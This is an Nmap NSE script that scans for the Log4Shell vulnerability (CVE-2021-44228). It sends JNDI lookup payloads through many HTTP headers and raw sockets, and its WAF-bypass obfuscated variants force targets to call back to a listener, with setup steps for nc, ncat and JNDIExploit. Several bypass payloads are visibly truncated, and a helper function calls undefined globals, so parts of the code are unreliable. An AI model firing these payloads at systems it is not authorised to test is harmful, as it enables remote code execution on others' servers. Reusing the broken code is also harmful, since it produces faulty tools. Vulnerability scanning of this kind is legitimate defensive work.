description = [[
Log4Shell - CVE-2021-44228

CVE-2021-44228 is a remote code execution (RCE) vulnerability in Apache Log4j 2.
An unauthenticated, remote attacker could exploit this flaw by sending a specially
crafted request to a server running a vulnerable version of log4j. The crafted
request uses a Java Naming and Directory Interface (JNDI) injection via a variety
of services including:

-  Lightweight Directory Access Protocol (LDAP)
-  Secure LDAP (LDAPS)
-  Remote Method Invocation (RMI)
-  Domain Name Service (DNS)

If the vulnerable server uses log4j to log requests, the exploit will then request
a malicious payload over JNDI through one of the services above from an
attacker-controlled server. Successful exploitation could lead to RCE.


Callback Server

The script relies on callbacks from the target being scanned and hence any
firewall rules or interaction with other security devices will affect the
efficacy of the script.


Netcat or Ncat:

- Listen a TCP port with netcat (or ncat):
    ncat -vkl 1389   # Ncat
    nc -lvnp 1389    # Netcat

- Run Nmap with --script log4shell.nse script
    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

- See the target IP address in netcat (or ncat) output:
    Ncat: Connection from 172.17.0.2.
    Ncat: Connection from 172.17.0.2:38898.

JNDIExploit:

- Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)

- Start JNDIExploit server:
    java -jar JNDIExploit.jar

- Run Nmap with --script log4shell.nse script
    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>

- See JNDIExploit output for see the received LDAP query (log4shell/{target host}/{target port})
    [+] Received LDAP Query: log4shell/127.0.0.1/8080
    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
]]

author     = 'Giuseppe Di Terlizzi <giuseppe DIT diterlizzi AT nttdata DOT com>'
license    = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe", "external"}

---
-- @usage
-- nmap --script log4shell --script-args log4shell.callback-server=127.0.0.1:1389 -p <port> <host>
-- @args callback-server  Callback server
-- @args http-headers     Comma-separated list of HTTP headers
-- @args http-method      HTTP method (default: GET)
-- @args url-path         URL path (default: /)
-- @args waf-bypass       WAF bypass
-- @args test-method      Test through 'http' (default), 'tcp', 'udp' or 'all'
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | log4shell: 
-- |   Payloads: 
-- |     ${jndi:ldap://127.0.0.1:389}
-- |   Path: /
-- |   Method: GET
-- |   Headers: 
-- |     X-Api-Version: 200
-- |     [...]
-- |_  Note: (!) Inspect the callback server (172.17.42.1:13890) or web-application (172.17.42.2:8080) logs
--
-- @xmloutput
-- <script id="log4shell" output="[...]">
--   <elem key="Callback">127.0.0.1:389</elem>
--   <elem key="Test Method">HTTP</elem>
--   <table key="Payloads">
--   <elem>${jndi:ldap://127.0.0.1:389}</elem>
--   </table>
--   <elem key="URL Path">/</elem>
--   <elem key="HTTP Method">GET</elem>
--   <table key="HTTP Headers">
--     <elem key="X-Api-Version">200 </elem>
--     <elem key="Referer">200 </elem>
--     <elem key="User-Agent">200 </elem>
--   </table>
--   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs</elem>
-- </script>
-- <script id="log4shell" output="[...]">
--   <elem key="Callback">127.0.0.1:389</elem>
--   <elem key="Test Method">Socket (tcp)</elem>
--   <table key="Payloads">
--   <elem>${jndi:ldap://127.0.0.1:389}</elem>
--   </table>
--   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or application (172.17.42.2:8080) logs</elem>
-- </script>
--
-- @changelog
-- 2021-12-11 - First release
-- 2021-12-13 - Test all headers known
--            - Changed output format
--            - Added "callback-server" arg (instead of "exploit-server")
-- 2021-12-14 - Added "http-headers" arg
--            - Improved output
-- 2021-12-15 - Improved XML result
--            - Added "http-method" arg (default: GET)
--            - Added "url-path" arg (default: /)
--            - Removed target info in LDAP URI
-- 2021-12-16 - Added "waf-bypass" arg (default: false)
--            - Added TCP/UDP socket check
--            - Added "test-method" arg (default: http)
-- 2021-12-17 - Added support for older Nmap releases (thanks to @giper45)
--

local http      = require "http"
local string    = require "string"
local table     = require "table"
local nmap      = require "nmap"
local stdnse    = require "stdnse"
local shortport = require "shortport"


local TESTS = { 'all', 'http', 'tcp', 'udp' }
local HTTP_METHODS = { 'GET', 'HEAD', 'POST', 'OPTIONS' }
local HTTP_HEADERS = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}

-- Default payload
local DEFAULT_PAYLOAD = '${jndi:ldap://%s}'

-- WAF (Web Application Firewall) bypass payloads
local WAF_BYPASS_PAYLOADS = {
  -- RMI
  '${jndi:rmi://%s}',
  '${${lower:jndi}:${lower:rmi}://%s}',
  '${jndi:${lower:r}${lower:m}${lower:i}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',

  -- DNS
  '${jndi:dns://%s}',
  '${${lower:jndi}:${lower:dns}://%s}',
  '${jndi:${lower:d}${lower:n}${lower:s}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://%s}',

  -- LDAP
  '${jndi:ldap://%s}',
  '${${lower:jndi}:${lower:ldap}://%s}',
  '${jndi:${lower:l}${lower:d}a${lower:p}',
  '${jndi:${lower:l}${lower:d}${lower:d}${lower:p}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://%s}',
  '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',
}

--- Copied from tableaux library for older Nmap releases
function contains(t, item, array)
  local iter = array and ipairs or pairs
  for k, val in iter(t) do
    if val == item then
      return true, k
    end
  end
  return false, nil
end

--- Copied from stringuax library for older Nmap releases
function strsplit(pattern, text)
  local list, pos = {}, 1;

  assert(pattern ~= "", "delimiter matches empty string!");

  while true do
    local first, last = find(text, pattern, pos);
    if first then -- found?
      list[#list+1] = sub(text, pos, first-1);
      pos = last+1;
    else
      list[#list+1] = sub(text, pos);
      break;
    end
  end
  return list;
end


portrule = function(host, port)
  return true
end


action = function(host, port)

  local callback_server  = stdnse.get_script_args(SCRIPT_NAME .. '.callback-server') or '127.0.0.1:1389'
  local waf_bypass       = stdnse.get_script_args(SCRIPT_NAME .. '.waf-bypass') or nil
  local http_headers_arg = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
  local http_method      = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
  local url_path         = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
  local test_method      = stdnse.get_script_args(SCRIPT_NAME .. '.test-method') or 'http'

  if not contains(TESTS, test_method) then
    stdnse.print_verbose("Skipping '%s' %s, unknown test-method", SCRIPT_NAME, SCRIPT_TYPE)
    return nil
  end

  local payloads = { DEFAULT_PAYLOAD }
  local output = stdnse.output_table()

  if waf_bypass ~= nil then
    payloads = WAF_BYPASS_PAYLOADS
  end

  output.Callback = callback_server
  output.Payloads = {}

  -- Check via HTTP
  if test_method == 'http' or test_method == 'all' then

    output['Test Method'] = 'HTTP'

    if shortport.http(host, port) then

      if not contains(HTTP_METHODS, http_method:upper()) then
        stdnse.verbose1("Skipping '%s' %s, unknown HTTP method", SCRIPT_NAME, SCRIPT_TYPE)
        return nil
      end
      
      local http_headers = HTTP_HEADERS
    
      output.Callback = callback_server
      output.Payloads = {}

      output['URL Path']     = url_path
      output['HTTP Method']  = http_method
      output['HTTP Headers'] = {}
    
      if http_headers_arg ~= nil then
        http_headers = strsplit(',', http_headers_arg)
      end
    
      for i, payload in ipairs(payloads) do
    
        local exploit_payload = string.format(payload, callback_server)
        output.Payloads[#output.Payloads + 1] = exploit_payload
    
        for x, payload_header in ipairs(http_headers) do
    
          stdnse.print_debug(1, string.format('%s --> %s', payload_header, exploit_payload))
    
          local header = {
            [payload_header] = exploit_payload
          }
    
          local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
          local status   = response.status
    
          if status == nil then
            -- Something went really wrong out there
            -- According to the NSE way we will die silently rather than spam user with error messages
          else
            local status_string = http.get_status_string(response)
            output['HTTP Headers'][payload_header] = status_string
          end
    
        end
      end
    
      output.Note = string.format('(!) Inspect the callback server (%s) or web-application (%s:%s) logs', callback_server, host.ip, port.number)
    
      return output

    end

  end

  -- Check TCP/UDP services
  if test_method == 'tcp' or test_method == 'udp' or test_method == 'all' then

    if test_method ~= 'all' and port.protocol ~= test_method then
      return nil
    end

    output['Test Method'] = string.format('Socket (%s)', port.protocol)

    if not shortport.http(host, port) then

      for i, payload in ipairs(payloads) do
    
        local exploit_payload = string.format(payload, callback_server)
        output.Payloads[#output.Payloads + 1] = exploit_payload
    
        local socket = nmap.new_socket(port.protocol)
        socket:set_timeout(host.times.timeout * 1000)
    
        socket:connect( host, port )
        local status, err = socket:send( exploit_payload )
        socket:close()
    
      end
    
      output.Note = string.format('(!) Inspect the callback server (%s) or application (%s:%s) logs', callback_server, host.ip, port.number)
    
      return output

    end
  end

end
